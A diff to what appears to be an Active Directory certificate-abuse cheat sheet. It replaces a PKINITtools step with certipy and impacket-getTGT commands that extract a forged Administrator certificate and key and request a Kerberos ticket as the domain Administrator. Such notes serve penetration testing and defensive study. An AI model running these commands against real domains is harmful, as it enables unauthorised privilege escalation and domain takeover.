@@ -121,10 +121,10 @@ user`. Two fixes:
   Cert now carries UPN + Administrator's SID → passes both certipy's check and the KDC.
 - **Chain with ESC16** (below) to disable the SID extension globally, then no `-sid` needed.
 
-If `certipy auth` still refuses on SID, PKINIT directly with PKINITtools (no SID check):
+If `certipy auth` still refuses on SID, extract PEM and use impacket's PKINIT support:
 ```bash
 certipy cert -pfx administrator.pfx -nokey -out adm.crt; certipy cert -pfx administrator.pfx -nocert -out adm.key
-python3 PKINITtools/gettgtpkinit.py -cert-pem adm.crt -key-pem adm.key domain.local/administrator adm.ccache -dc-ip <dc>
+impacket-getTGT -cert-pem adm.crt -key-pem adm.key -dc-ip <dc> domain.local/administrator
 ```
 
 ---
